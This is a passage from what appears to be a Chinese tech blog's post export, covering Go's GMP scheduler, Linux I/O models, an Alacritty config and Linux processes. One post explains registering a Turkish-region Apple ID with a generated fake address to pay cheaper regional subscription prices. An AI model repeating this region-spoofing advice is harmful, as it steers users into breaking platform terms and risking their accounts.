P 的本地队列偷一半放到自己 P 的本地队列。**M 运行 G，G 执行之后，M 会从 P 获取下一个 G，不断重复下去。\n\nGoroutine 调度器和 操作系统调度器是通过 M 结合起来的，每个 M 都代表了 1 个内核线程，操作系统调度器负责把内核线程分配到 CPU 的核上执行。\n\n### 3.2 P和M的数量\n\n自 Go 1.5开始， Go的`GOMAXPROCS`默认值已经设置为 CPU的核数， 这允许我们的Go程序充分使用机器的每一个CPU。\n\n##### 1. P 的数量\n\n由启动时环境变量 $GOMAXPROCS 或者是由 runtime 的方法 GOMAXPROCS() 决定。这意味着在程序执行的任意时刻都只有 $GOMAXPROCS 个 goroutine 在同时运行。\n\n##### 2. M 的数量\n\n+ go 语言本身的限制：go 程序启动时，会设置 M 的最大数量，默认 10000. 但是内核很难支持这么多的线程数，所以这个限制可以忽略。\n\n+ runtime/debug 中的 SetMaxThreads 函数，设置 M 的最大数量\n\n+ 一个 M 阻塞了，会创建新的 M。\n\nM 与 P 的数量没有绝对关系，一个 M 阻塞，P 就会去创建或者切换另一个 M，所以，即使 P 的默认数量是 1，也有可能会创建很多个 M 出来。\n\n### 3.3 P 和 M 何时会被创建\n\n##### 1. P 何时创建\n\n在确定了 P 的最大数量 n 后，运行时系统会根据这个数量创建 n 个 P。\n\n##### 2. M 何时创建\n\n没有足够的 M 来关联 P 并运行其中的可运行的 G。比如所有的 M 此时都阻塞住了，而 P 中还有很多就绪任务，就会去寻找空闲的 M，而没有空闲的，就会去创建新的 M。\n\n\n\n### 3.4  调度器的设计策略\n\n##### 1. 复用线程\n\n避免频繁的创建、销毁线程，而是对线程的复用。\n\n+ work stealing 机制\n\n 当本线程无可运行的 G 时，尝试从其他线程绑定的 P 偷取 G，而不是销毁线程。\n\n+ hand off 机制\n\n 当本线程因为 G 进行系统调用阻塞时，线程释放绑定的 P，把 P 转移给其他空闲的线程执行。\n\n##### 2. 利用并行\n\nGOMAXPROCS 设置 P 的数量，最多有 GOMAXPROCS 个线程分布在多个 CPU 上同时运行。\n\nGOMAXPROCS 也限制了并发的程度，比如 GOMAXPROCS = 核数/2，则最多利用了一半的 CPU 核进行并行。\n\n##### 3. 抢占\n\n在 coroutine 中要等待一个协程主动让出 CPU 才执行下一个协程，在 Go 中，一个 goroutine 最多占用 CPU 10ms，防止其他 goroutine 被饿死。\n\n##### 4. 全局 G 队列\n\n在新的调度器中依然有全局 G 队列，但功能已经被弱化了。M先从全局 G 队列获取 G。全局队列里没有，再从其他的P的本地队列中后半部分偷取。\n\n\n\n### 3.5 一个go func()的流程\n\n<img src=\"golang的GMP调度模型/a4vWtvRWGQ.jpeg\" alt=\"18-go-func调度周期.jpeg\" style=\"zoom:67%;\" />\n\n\n\n 1、我们通过 go func () 来创建一个 goroutine；\n\n 2、有两个存储 G 的队列，一个是局部调度器 P 的本地队列、一个是全局 G 队列。新创建的 G 会先保存在 P 的本地队列中，如果 P 的本地队列已经满了就会保存在全局的队列中；\n\n 3、G 只能运行在 M 中，执行中的M 与 P 是 1：1 的关系。M 会从 P 的本地队列弹出一个可执行状态的 G 来执行，如果 P 的本地队列为空，就会向其他的 MP 组合偷取一半或全局队列可执行的 G 来执行；\n\n 4、一个 M 调度 G 执行的过程是一个循环机制；\n\n 5、当 M 执行某一个 G 时候如果发生了 syscall 或则其余阻塞操作，M 会阻塞，如果当前有一些 G 在执行，runtime 会把这个线程 M 从 P 中摘除 (detach)，然后再创建一个新的操作系统的线程 (如果有空闲的线程可用就复用空闲线程) 来服务于这个 P；\n\n> 这个M拿着这个G阻塞休眠了。把P队列，扔给别的M了。\n\n 6、当 M 系统调用结束时候，这个 M 会尝试获取一个空闲的 P 执行，并把 G 放入到这个 P 的本地队列。如果获取不到 P，那么这个线程 M 变成休眠状态， 加入到空闲线程中，然后这个 G 会被放入全局队列中。\n\n\n\n### 3.6 调度器的生命周期\n\n<img src=\"golang的GMP调度模型/j37FX8nek9.png\" alt=\"j37FX8nek9\" style=\"zoom: 67%;\" />\n\n##### M0\n\nM0 是启动程序后的编号为 0 的主线程，这个 M 对应的实例会在全局变量 runtime.m0 中，不需要在 heap 上分配，M0 负责执行初始化操作和启动第一个 G， 在之后 M0 就和其他的 M 一样了。\n\n##### G0\n\nG0 是每次启动一个 M 都会第一个创建的 goroutine，G0 仅用于负责调度的 G，G0 不指向任何可执行的函数，每个 M 都会有一个自己的 G0。在调度或系统调用时会使用 G0 的栈空间，全局变量的 G0 是 M0 的 G0。\n\n##### 代码分析\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello world\")\n}\n```\n\n+ runtime 创建最初的线程 m0 和 goroutine g0，并把 2 者关联。\n+ 调度器初始化：初始化 m0、栈、垃圾回收，以及创建和初始化由 GOMAXPROCS 个 P 构成的 P 列表。\n+ 示例代码中的 main 函数是 main.main，runtime 中也有 1 个 main 函数 ——runtime.main，代码经过编译后，runtime.main 会调用 main.main，程序启动时会为 runtime.main 创建 goroutine，称它为 main goroutine 吧，然后把 main goroutine 加入到 P 的本地队列。\n+ 启动 m0，m0 已经绑定了 P，会从 P 的本地队列获取 G，获取到 main goroutine。\n+ G 拥有栈，M 根据 G 中的栈信息和调度信息设置运行环境\n+ M 运行 G\n+ G 退出，再次回到 M 获取可运行的 G，这样重复下去，直到 main.main 退出，runtime.main 执行 Defer 和 Panic 处理，或调用 runtime.exit 退出程序。\n+ 调度器的生命周期几乎占满了一个 Go 程序的一生，runtime.main 的 goroutine 执行之前都是为调度器做准备工作，runtime.main 的 goroutine 运行，才是调度器的真正开始，直到 runtime.main 结束而结束。\n\n\n\n# 4. 场景解析\n\n### 4.1 创建新goroutine\n\nP 拥有 G1，M1 获取 P 后开始运行 G1，G1 使用 `go func()` 创建了 G2，为了局部性 G2 优先加入到 P1 的本地队列。\n\n<img src=\"golang的GMP调度模型/Pm8LOYcsWQ.png\" alt=\"Pm8LOYcsWQ\" style=\"zoom:50%;\" />\n\n### 4.2 线程执行P的队列\n\nG1 运行完成后 (函数：goexit)，M 上运行的 goroutine 切换为 G0，G0 负责调度时协程的切换（函数：schedule）。从 P 的本地队列取 G2，从 G0 切换到 G2，并开始运行 G2 (函数：execute)。实现了线程 M1 的复用。\n\n<img src=\"golang的GMP调度模型/JWDtmKG3rK.png\" alt=\"27-gmp场景2.png\" style=\"zoom:50%;\" />\n\n### 4.3 P的队列满的时候\n\n假设每个 P 的本地队列只能存 3 个 G。G2 要创建了 6 个 G，前 4 个 G（G3, G4, G5,G6）已经加入 p1 的本地队列，p1 本地队列满了。\n\n<img src=\"golang的GMP调度模型/UpjRxzIBd3.png\" alt=\"28-gmp场景3.png\" style=\"zoom:50%;\" />\n\nG2 在创建 G7 的时候，发现 P1 的本地队列已满，需要执行**负载均衡** (把 P1 中本地队列中前一半的 G，还有新创建 G **转移**到全局队列)\n\n<img src=\"golang的GMP调度模型/chqTgsiuWi.png\" alt=\"29-gmp场景4.png\" style=\"zoom:50%;\" />\n\n这些 G 被转移到全局队列时，会被打乱顺序。所以 G3,G4,G7 被转移到全局队列。\n\n\n\n### 4.4  P的队列继续创建gorutine\n\nG2 创建 G8 时，P1 的本地队列未满，所以 G8 会被加入到 P1 的本地队列。G8 加入到 P1 点本地队列的原因还是因为 P1 此时在与 M1 绑定，而 G2 此时是 M1 在执行。所以 G2 创建的新的 G 会优先放置到自己的 M 绑定的 P 上。\n\n<img src=\"golang的GMP调度模型/nukEY92G6D.png\" alt=\"30-gmp场景5.png\" style=\"zoom:50%;\" />\n\n### 4.5 创建Gotutine时，唤醒其他的P和M\n\n在创建 G 时，运行的 G 会尝试唤醒其他空闲的 P 和 M 组合去执行。假定 G2 唤醒了 M2，M2 绑定了 P2，并运行 G0，但 P2 本地队列没有 G，M2 此时为自旋线程（没有 G 但为运行状态的线程，不断寻找 G）。\n\n<img src=\"golang的GMP调度模型/2FWNXSuHfX.png\" alt=\"31-gmp场景6.png\" style=\"zoom:50%;\" />\n\n### 4.6 M从全局队列拿G\n\nM2 尝试从全局队列 (简称 “GQ”) 取一批 G 放到 P2 的本地队列（函数：`findrunnable()`）。M2 从全局队列取的 G 数量符合下面的公式：\n\n```bash\nn = min(len(GQ)/GOMAXPROCS + 1, len(GQ/2))\n```\n\n至少从全局队列取 1 个 g，但每次不要从全局队列移动太多的 g 到 p 本地队列，给其他 p 留点。这是从全局队列到 P 本地队列的负载均衡。\n\n<img src=\"golang的GMP调度模型/0fn8DGqI8N.jpeg\" alt=\"32-gmp场景7.001.jpeg\" style=\"zoom: 67%;\" />\n\n假定我们场景中一共有 4 个 P（GOMAXPROCS 设置为 4，那么我们允许最多就能用 4 个 P 来供 M 使用）。所以 M2 只从能从全局队列取 1 个 G（即 G3）移动 P2 本地队列，然后完成从 G0 到 G3 的切换，运行 G3。\n\n### 4.7 M偷取别的M的G\n\n假设 G2 一直在 M1 上运行，经过 2 轮后，M2 已经把 G7、G4 从全局队列获取到了 P2 的本地队列并完成运行，全局队列和 P2 的本地队列都空了，如场景 8 图的左半部分。\n\n<img src=\"golang的GMP调度模型/qn1NRMLqnp.png\" alt=\"33-gmp场景8.png\" style=\"zoom:67%;\" />\n\n全局队列已经没有 G，那 m 就要执行 work stealing (偷取)：从其他有 G 的 P 哪里偷取一半 G 过来，放到自己的 P 本地队列。P2 从 P1 的本地队列尾部取一半的 G，本例中一半则只有 1 个 G8，放到 P2 的本地队列并执行。\n\n\n\n### 4.8 自旋线程M\n\nG1 本地队列 G5、G6 已经被其他 M 偷走并运行完成，当前 M1 和 M2 分别在运行 G2 和 G8，M3 和 M4 没有 goroutine 可以运行，M3 和 M4 处于自旋状态，它们不断寻找 goroutine。\n\n<img src=\"golang的GMP调度模型/1DjlseEGTT.png\" alt=\"34-gmp场景9.png\" style=\"zoom:67%;\" />\n\n为什么要让 m3 和 m4 自旋，自旋本质是在运行，线程在运行却没有执行 G，就变成了浪费 CPU. 为什么不销毁现场，来节约 CPU 资源。因为创建和销毁 CPU 也会浪费时间，我们希望当有新 goroutine 创建时，立刻能有 M 运行它，如果销毁再新建就增加了时延，降低了效率。当然也考虑了过多的自旋线程是浪费 CPU，所以系统中最多有 GOMAXPROCS 个自旋的线程 (当前例子中的 GOMAXPROCS=4，所以一共 4 个 P)，多余的没事做线程会让他们休眠。\n\n\n\n### 4.9 M阻塞后解绑P，P找其他M组合。\n\n假定当前除了 M3 和 M4 为自旋线程，还有 M5 和 M6 为空闲的线程 (没有得到 P 的绑定，注意我们这里最多就只能够存在 4 个 P，所以应该是 M>=P, 大部分都是 M 在抢占需要运行的 P)。\n\nG8 创建了 G9，G8 进行了阻塞的系统调用，M2 和 P2 立即解绑。\n\nP2 会执行以下判断：如果 P2 本地队列有 G、全局队列有 G 或有空闲的 M，P2 都会立马唤醒 1 个 M 和它绑定，否则 P2 则会加入到空闲 P 列表，等待 M 来获取可用的 p。\n\n本场景中，P2 本地队列有 G9，可以和其他空闲的线程 M5 绑定。\n\n<img src=\"golang的GMP调度模型/k3HKE9U21M.png\" alt=\"35-gmp场景10.png\" style=\"zoom:67%;\" />\n\n\n\n### 4.10 M唤醒后先找P，找不到M去休眠，G去全局。\n\nG8 创建了 G9，假如 G8 进行了非阻塞系统调用。\n\nM2 和 P2 会解绑，但 M2 会记住 P2，然后 G8 和 M2 进入系统调用状态。当 G8 和 M2 退出系统调用时，会尝试获取 P2，如果无法获取，则获取空闲的 P，如果依然没有，G8 会被记为可运行状态，并加入到全局队列，M2 因为没有 P 的绑定而变成休眠状态 (长时间休眠等待 GC 回收销毁)。\n\n\n\n<img src=\"golang的GMP调度模型/zBvpl8ENSb.png\" alt=\"36-gmp场景11.png\" style=\"zoom:67%;\" />\n\n# 5. 头脑风暴\n\n### 5.1 io密集任务， 增大GOMAXPROCS有效吗?\n\n有效。参考：https://colobu.com/2017/10/11/interesting-things-about-GOMAXPROCS/\n\nGo 运行时并行执行的 goroutines 数量是小于等于 P 的数量的，如果一个持有 P 的 M，由于 P 当前执行的 G 调用了 syscall 而导致 M 被阻塞，调度器相对迟钝，很可能直到 M 阻塞一定时间后才发现被阻塞了，然后才用空闲的 M 来抢这个 P。\n\n通过将`GOMAXPROCS`设置更大的数(64/128, 数倍CPU核数), 会提高I/O的吞吐率。\n\n### 5.2 GMP 模型，为什么要有 P？\n\n在 Go1.1 之前 Go 的调度模型其实就是 GM 模型，也就是没有 P。\n\n+ 创建、销毁、调度 G 都需要每个 M 获取锁，这就形成了激烈的锁竞争。\n+ M 转移 G 会造成延迟和额外的系统负载。比如当 G 中包含创建新协程的时候，M 创建了 G’，为了继续执行 G，需要把 G’交给M’执行，也造成了很差的局部性，因为 G’和 G 是相关的，最好放在 M 上执行，而不是其他 M’。\n+ 系统调用 (CPU 在 M 之间的切换) 导致频繁的线程阻塞和取消阻塞操作增加了系统开销。\n\n**加了P以后**\n\n+ 每个 P 有自己的本地队列，而不是所有的 G 操作都要经过全局的 G 队列，这样锁的竞争会少的多的多。而 GM 模型的性能开销大头就是锁竞争。\n+ 每个 P 相对的平衡上，在 GMP 模型中也实现了 Work Stealing 算法，如果 P 的本地队列为空，则会从全局队列或其他 P 的本地队列中窃取可运行的 G 来运行，减少空转，提高了资源利用率。\n+  hand off 机制当 M0 线程因为 G1 进行系统调用阻塞时，线程释放绑定的 P，把 P 转移给其他空闲的线程 M1 执行，同样也是提高了资源利用率。\n\n### 5.3 单核 CPU，开两个 Goroutine，其中一个死循环，会怎么样？\n\n```go\nfunc main() {\n    // 模拟单核 CPU\n    runtime.GOMAXPROCS(1)\n    \n    // 模拟 Goroutine 死循环\n    go func() {\n        for {\n        }\n    }()\n    time.Sleep(time.Second)\n    fmt.Println(\"哈哈\")\n}\n```\n\n- 在 Go1.14 前，不会输出任何结果。\n- 在 Go1.14 及之后，能够正常输出结果。(在 Go1.14 实现了基于信号的抢占式调度)\n\n### 5.4 总结\n\n+ 首先协程和进程是M：N的关系，协程最终运行在线程里，通过go调度。\n+ G: gorotuine，M: threads  P：processor(处理器)。\n+ P由GOMAXPROCS() 决定的，带一个队列放着一堆G，P会和M绑定。还有一个全局队列。\n+ 创建go的时候，先会加到P的本地，满了上全局。\n+ 一个是偷取机制。M运行时，先从P的本地拿G。没有全局拿G，没有从别的P偷一半G。\n+ 一个是阻塞移交机制。如果go阻塞调用了，P还会和M解绑。P找空闲的M组合。等阻塞结束，如果没找到P，把G放全局队列，M休眠。\n\n\n# 6. 参考资料\n+ https://learnku.com/articles/41728\n+ https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-goroutine/\n+ [一道问题引发的golang调度](https://txiner.top/post/一道问题引发的golang调度/)\n+ https://juejin.cn/post/6968311281220583454\n\n  \n","tags":["golang"],"categories":["2_golang底层"]},{"title":"土耳其applestore购买dropbox","url":"%2Fp%2F39009612.html","content":"\n\n\n# 1. 土区Apple ID\n\n### 1.1 注册\n\n在 [https://appleid.apple.com/](https://appleid.apple.com/) 上面注册，注册时地区选择土耳其，手机号用国内的手机号就可以。\n\n地址生成器： https://www.addresscopy.com/Turkey\n\n### 1.2 充值\n\n充值的话在淘宝购买礼品卡或者一些第三方网站上购买都可以，我是用来订阅的，所以账号封了也无所谓。如果你想大量购买软件，请自行寻找安全的礼品卡购买渠道。可以先充值 25 里拉试一下能否消费再大量充值。\n\n### 1.3 消费\n\n土区因为汇率问题很多内购都比其他区便宜，以 Telegram 会员举例，美区 $4.99 ，土区 13.99 里拉，折合人民币 5 块多。但是 tg 会员只能冲到自己号上，赠送还是美区的价格。土区的各种会员都很便宜，可以自己探索或者上网搜索，但是国内的会员基本上没有土区特权。\n\n<!-- more -->\n\n### 1.4 礼品卡支付\n\n可以登录网页版将付款信息改为“无”，百度搜索土区地址和电话填写进去即可继续使用余额支付。\n\n 是去苹果官网账号管理，添加支付信息账单信息，支付方式选择无，然后 ios 应该就可以余额付了。\n\n\n\n# 2. 礼品卡\n\n介绍：https://yummy.best/turkey-giftcard/\n\n汇率：https://www.google.com.hk/search?q=%E6%B1%87%E7%8E%87%E5%85%91%E6%8D%A2\n\n\n\n### 2.1 购买地址\n\nhttps://www.oyunfor.com/apple-store/apple-store-itunes-gift-card\n\nhttps://www.turgame.com/itunes-gift-cards/\n\nhttps://www.mtcgame.com/zh-CN/apple-store/itunes-hediye-karti  **！！不仅溢价，还要手持照片认证，坑爹不要用！！**\n\n\n\n# 3. dropbox\n\n### 3.1 购买\n\n1. 新号->  dropbox网页试用plus会员一个月-> 取消试用\n2. 登录iOS dropbox 账号，点击升级，订阅付费即可。\n3. 订阅后在 app store 里找到现有订阅，点进去，有个选项 see all plans ，里面可以换成 pro 版年付。\n\n\n\n# 4. 参考资料\n\n+ https://www.v2ex.com/t/881793【土区 Apple ID 注册消费方法】\n\n- https://www.v2ex.com/t/879134 【如何正确的注册土耳其地区的 Apple ID？】","categories":["软件"]},{"title":"linux的io模型","url":"%2Fp%2F9864e52a.html","content":"\n# 1. 基础术语\n\n先抛出知乎的一个问题:  https://www.zhihu.com/question/59975081\n\nepoll技术属于IO复用，IO复用属于同步IO，所以epoll属于同步IO，这应该是没毛病的。\n\n现在我用了一个框架，比如twisted，里面的reactor模式的实现是基于epoll或者poll的，在IO的范畴应该是属于同步IO，但是网上几乎所有的文章都说twisted是异步的。\n\n我的问题是，异步与异步IO是不是一个东西？有没有可能异步可以由同步IO(epoll或poll)实现？\n\n<!-- more -->\n\n### 1.1 进程之间通信的层次\n\n关于同步、异步、阻塞、非阻塞在《操作系统概念(第九版)》中有如下解释\n\n<img src=\"linux的io模型/v2-d6729b9e95e8f20c4e53215327596692_720w.jpg\" alt=\"img\" style=\"zoom:90%;\" />\n\n进程间的通信是通过 send() 和 receive() 两种基本操作完成的。具体如何实现这两种基础操作，存在着不同的设计。 消息的传递有可能是阻塞的或非阻塞的 -- 也被称为同步或异步的。\n\n- 阻塞式发送（blocking send）. 发送方进程会被一直阻塞， 直到消息被接受方进程收到。\n- 非阻塞式发送（nonblocking send）。 发送方进程调用 send() 后， 立即就可以其他操作。\n- 阻塞式接收（blocking receive） 接收方调用 receive() 后一直阻塞， 直到消息到达可用。\n- 非阻塞式接受（nonblocking receive） 接收方调用 receive() 函数后， 要么得到一个有效的结果， 要么得到一个空值， 即不会被阻塞。\n\n上述不同类型的发送方式和不同类型的接收方式，可以自由组合。\n\n**也就是说， 从进程级通信的维度讨论时， 阻塞和同步（非阻塞和异步）就是一对同义词， 且需要针对发送方和接收方作区分对待。**\n\n\n\n### 1.2 I/O 系统调用的层次\n\n在处理 IO 的时候，阻塞和非阻塞都是同步 IO。\n\n![1](linux的io模型/0.png)\n\n#####  阻塞 IO\n\n阻塞这个词是与系统调用 System Call 紧紧联系在一起的， 因为要让一个进程进入 等待（waiting） 的状态, 要么是它主动调用 wait() 或 sleep() 等挂起自己的操作， 另一种就是它调用 System Call, 而 System Call 因为涉及到了 I/O 操作， 不能立即完成， 于是内核就会先将该进程置为等待状态， 调度其他进程的运行， 等到 它所请求的 I/O 操作完成了以后， 再将其状态更改回 ready 。\n\n```c\nlistenfd = socket();   // 打开一个网络通信端口\nbind(listenfd);        // 绑定\nlisten(listenfd);      // 监听\nwhile(1) {\n  connfd = accept(listenfd);  // 阻塞建立连接\n  int n = read(connfd, buf);  // 阻塞读数据\n  doSomeThing(buf);  // 利用读到的数据做些什么\n  close(connfd);     // 关闭连接，循环等待下一个连接\n}\n```\n\n\n\n##### 非阻塞 IO \n\n现在的大部分操作系统也会提供非阻塞I/O 系统调用接口（Nonblocking I/O system call）。 一个非阻塞调用不会挂起调用程序， 而是会立即返回一个值， 表示有多少bytes 的数据被成功读取（或写入）。\n\n```c\nfcntl(connfd, F_SETFL, O_NONBLOCK);\nint n = read(connfd, buffer) != SUCCESS);\n```\n\n\n\n### 1.3 前文问题解答\n\n简单说一句话，你需要分层看这个事。\n\nepoll 这个系统调用，是同步的，也就是必须等待操作系统返回值。而底层用了 epoll 的封装后的框架，可以是异步的，只要你暴露给外部的接口，无需等待你的返回值即可。\n\n再多说些，epoll 这个系统调用的底层内核设计里，每个 IO 事件的通知等待，是异步的。但这不影响，epoll 这个系统调用对外部来说，是一个同步的接口。\n\n所以你说，有的地方说同步，有的地方说异步，其实是不同分层的视角看。\n\n\n\n# 2. Linux下的五种I/O模型(apue)\n\nLinux下主要有以下五种I/O模型：\n\n1. 阻塞I/O（blocking IO）\n2. 非阻塞I/O (nonblocking I/O)\n3. I/O 复用 (I/O multiplexing)（select、poll、linux 2.6种改进的epoll）\n4. 信号驱动I/O (signal driven I/O (SIGIO))\n5. 异步I/O (asynchronous I/O)\n\n\n\n### 2.1 阻塞IO 模型\n\n> 最傻，不能忍。\n\n进程会一直阻塞，直到数据拷贝完成 应用程序调用一个IO函数，导致应用程序阻塞，等待数据准备好。数据准备好后，从内核拷贝到用户空间，IO函数返回成功指示。\n\n![1](linux的io模型/1.png)\n\n\n\n### 2.2 非阻塞IO模型\n\n> 循环调用询问， OK了开始拷贝，拷贝中需要等待。\n\n通过进程反复调用IO函数，**在数据从内核拷贝到用户空间过程中，进程是阻塞的。**\n\n![1](linux的io模型/2.png)\n\n### 2.3 IO复用模型\n\n> ok了被通知， 拷贝中需要等待。\n\n主要是select和epoll。一个线程可以对多个IO端口进行监听，当socket有读写事件时分发到具体的线程进行处理。\n\n![1](linux的io模型/3.png)\n\n\n\n### 2.4 信号驱动IO模型\n\n> ok了被通知，拷贝中需要等待。\n\n首先我们允许Socket进行信号驱动IO,并安装一个信号处理函数，进程继续运行并不阻塞。当数据准备好时，进程会收到一个SIGIO信号，可以在信号处理函数中调用I/O操作函数处理数据。\n\n![1](linux的io模型/4.png)\n\n### 2.5 异步IO模型\n\n> ok了被通知，拷贝完成后被通知。\n\n相对于同步IO，异步IO不是顺序执行。用户进程进行aio_read系统调用之后，无论内核数据是否准备好，都会直接返回给用户进程，然后用户态进程可以去做别的事情。**等到socket数据准备好了，内核直接复制数据给进程，然后从内核向进程发送通知。IO两个阶段，进程都是非阻塞的。**\n\n![1](linux的io模型/5.png)\n\n\n\n\n\n# 3. 非阻塞IO为什么是同步IO?\n\n### 3.1 同步IO和异步IO的区别\n\nA synchronous I/O operation causes the requesting process to be blocked until that I/O operation completes;\nAn asynchronous I/O operation does not cause the requesting process to be blocked;\n\n两者的区别就在于同步IO 做 IO操作的时候会将process阻塞。\n\n\n\n按照这个定义，之前所述的blocking IO，non-blocking IO，IO multiplexing都属于synchronous IO。注意到non-blocking IO会一直轮询(polling)，这个过程是没有阻塞的，但是recvfrom阶段blocking IO,non-blocking IO和IO multiplexing都是阻塞的。\n\n而asynchronous IO则不一样，当进程发起IO 操作之后，就直接返回再也不理睬了，直到kernel发送一个信号，告诉进程说IO完成。在这整个过程中，进程完全没有被block。\n\n\n\n### 3.2 非阻塞IO在内核拷贝数据中是阻塞的\n\nPOSIX把I/O操作划分成两类：\n\n- 同步I/O: 同步I/O操作导致请求进程阻塞，直至操作完成\n\n- 异步I/O: 异步I/O操作不导致请求阻塞\n  \n\n所以Unix的前四种I/O模型都是同步I/O, 只有最后一种才是异步I/O。\n\n+ 阻塞IO模型，非阻塞IO模型，IO复用模型，信号驱动IO模型都是同步IO。 \n+ 非阻塞之所以是同步，是因为recvfrom会将数据从kernel拷贝到用户内存中，这个时候进程是被block了，在这段时间内，进程是被block的。\n\n![1](linux的io模型/6.png)\n\n\n\n\n\n# 4.1 Java IO 和 Linux IO\n\n### 1. Java IO\n\n+ BIO(Blocking I/O)\n\n+ NIO(Non-blocking I/O)\n\n  在Java领域，也称为New I/O。 \n\n  Java NIO ([JSR 51](https://www.jcp.org/en/jsr/detail?id=51))定义了Java new I/O API，提案2000年提出,2002年正式发布。 JDK 1.4起包含了相应的API实现。 \n\n+ AIO(Asynchronous I/O)\n\n  JAVA NIO2 ([JSR 203](https://www.jcp.org/en/jsr/detail?id=203))定义了更多的 New I/O APIs， 提案2003提出，直到2011年才发布， 最终在JDK 7中才实现。\n\n当前很多的项目还停留在JAVA NIO的实现上， 对JAVA AIO(asynchronous I/O)着墨不多。\n\n### 2. 和Linux IO 对应关系\n\n再次重复linux的前四种I/O模型都是同步I/O, 只有最后一种才是异步I/O。\n\n+ 传统的Java BIO (blocking I/O)是Unix I/O模型中的第一种。\n+ Java NIO中如果不使用select模式，而只把channel配置成nonblocking则是第二种模型。\n+ Java NIO select实现的是一种多路复用I/O。 底层使用epoll或者相应的poll系统调用。\n+ 第四种模型JDK应该是没有实现。\n+ Java NIO2增加了对第五种模型的支持，也就是AIO。\n\n\n\n# 5. 参考资料\n\n+ https://www.liuvv.com/p/457c2d1f.html\n\n+ https://www.zhihu.com/question/19732473/answer/117012135\n\n+  https://www.zhihu.com/question/59975081/answer/1932776593\n\n+ https://juejin.im/post/6844903782094995470\n\n+ https://colobu.com/2014/11/13/java-aio-introduction/\n\n+ https://www.cnblogs.com/dolphin0520/p/3916526.html\n\n  \n\n","tags":["io"],"categories":["io"]},{"title":"alacritty替代iterm2","url":"%2Fp%2F3e10f03d.html","content":"\n# 1. alacritty\n\n### 1.1 介绍\n\niterm2 无疑是所有平台里功能最强的终端，遗憾的是目前 GPU 加速并不完美。\n\nalacritty是目前性能最强的终端之一. 它使用GPU进行渲染，可以做到其他启动器无法实现的性能优化。\n\n尤其 `tmux`配合`alacritty`, 使用下来比 iTerm2 更快更顺手更省电。\n\n<!-- more -->\n\n### 1.2 安装\n\nhttps://github.com/alacritty/alacritty/releases\n\n下载对应安装包安装即可\n\n![image-20210218231303338](alacritty%E6%9B%BF%E4%BB%A3iterm2/image-20210218231303338.png)\n\n# 2. 配置\n\n### 2.1 配置方法\n\nAlacritty doesn't create the config file for you, but it looks for one in the following locations:\n\n```bash\n$XDG_CONFIG_HOME/alacritty/alacritty.yml\n$XDG_CONFIG_HOME/alacritty.yml\n$HOME/.config/alacritty/alacritty.yml\n$HOME/.alacritty.yml\n```\n\n\n\n下载 github 的模板\n\n```bash\nmv ~/Downloads/alacritty.yml ~/.alacritty.yml\n```\n\n修改保存即生效\n\n\n\n### 2.2 我的配置\n\n```yml\n# 环境变量\nenv:\n  TERM: alacritty\n\n# 字体\nfont:\n  normal:\n    family: MesloLGS NF\n  size: 17.0\n\n\n# 选中面板自动复制\nselection:\n  save_to_clipboard: true\n  \n\n# 吸血鬼配色\ncolors:\n  primary:\n    background: '0x282a36'\n    foreground: '0xf8f8f2'\n  cursor:\n    text: CellBackground\n    cursor: CellForeground\n  vi_mode_cursor:\n    text: CellBackground\n    cursor: CellForeground\n  search:\n    matches:\n      foreground: '0x44475a'\n      background: '0x50fa7b'\n    focused_match:\n      foreground: '0x44475a'\n      background: '0xffb86c'\n    bar:\n      background: '0x282a36'\n      foreground: '0xf8f8f2'\n  line_indicator:\n    foreground: None\n    background: None\n  selection:\n    text: CellForeground\n    background: '0x44475a'\n  normal:\n    black:   '0x000000'\n    red:     '0xff5555'\n    green:   '0x50fa7b'\n    yellow:  '0xf1fa8c'\n    blue:    '0xbd93f9'\n    magenta: '0xff79c6'\n    cyan:    '0x8be9fd'\n    white:   '0xbfbfbf'\n  bright:\n    black:   '0x4d4d4d'\n    red:     '0xff6e67'\n    green:   '0x5af78e'\n    yellow:  '0xf4f99d'\n    blue:    '0xcaa9fa'\n    magenta: '0xff92d0'\n    cyan:    '0x9aedfe'\n    white:   '0xe6e6e6'\n  dim:\n    black:   '0x14151b'\n    red:     '0xff2222'\n    green:   '0x1ef956'\n    yellow:  '0xebf85b'\n    blue:    '0x4d5b86'\n    magenta: '0xff46b0'\n    cyan:    '0x59dffc'\n    white:   '0xe6e6d1'\n```\n\n\n\n#  3. 参考资料\n\n+ https://github.com/alacritty/alacritty\n\n+ https://github.com/dracula/alacritty\n\n  ","tags":["alacritty"],"categories":["终端"]},{"title":"linux进程线程原语","url":"%2Fp%2F21124b9a.html","content":"\n# 1. 进程和线程\n\n### 1.1  进程\n\n我们编写的代码只是一个存储在硬盘的静态文件，通过编译后就会生成二进制可执行文件，当我们运行这个可执行文件后，它会被装载到内存中，接着 CPU 会执行程序中的每一条指令，那么这个行中的程序，就被称为「进程」（Process）。\n\n##### 进程的基本状态\n\n在一个进程的活动期间至少具备三种基本状态，即运行状态、就绪状态、阻塞状态。\n\n- 运行状态（*Running*）：该时刻进程占用 CPU；\n- 就绪状态（*Ready*）：可运行，由于其他进程处于运行状态而暂时停止运行；\n- 阻塞状态（*Blocked*）：该进程正在等待某一事件发生（如等待输入/输出操作的完成）而暂时停止运行，这时，即使给它CPU控制权，它也无法运行；\n\n<img src=\"linux进程线程原语/7-进程三个基本状态.jpg\" alt=\"进程的三种基本状态\" style=\"zoom:70%;\" />\n\n<!-- more -->\n\n##### 进程控制块PCB\n\nPCB 是进程存在的唯一标识，这意味着一个进程的存在，必然会有一个 PCB，如果进程消失了，那么 PCB 也会随之消失。\n\n1. 进程描述信息：\n\n   + 进程标识符：标识各个进程，每个进程都有一个并且唯一的标识符；\n   + 用户标识符：进程归属的用户，用户标识符主要为共享和保护服务；\n\n\n2. 进程控制和管理信息：\n\n   + 进程当前状态，如 new、ready、running、waiting 或 blocked 等；\n\n   + 进程优先级：进程抢占 CPU 时的优先级；\n\n\n3. 资源分配清单：\n   + 有关内存地址空间或虚拟地址空间的信息，所打开文件的列表和所使用的 I/O 设备信息。\n\n\n4. CPU 相关信息： \n   + CPU 中各个寄存器的值，当进程被切换时，CPU 的状态信息都会被保存在相应的 PCB 中，以便进程重新执行时，能从断点处继续执行。\n\n##### 进程的上下文切换\n\n> 进程是由内核管理和调度的，所以进程的切换只能发生在内核态。\n\n\n\nCPU 上下文切换就是先把前一个任务的 CPU 上下文（CPU 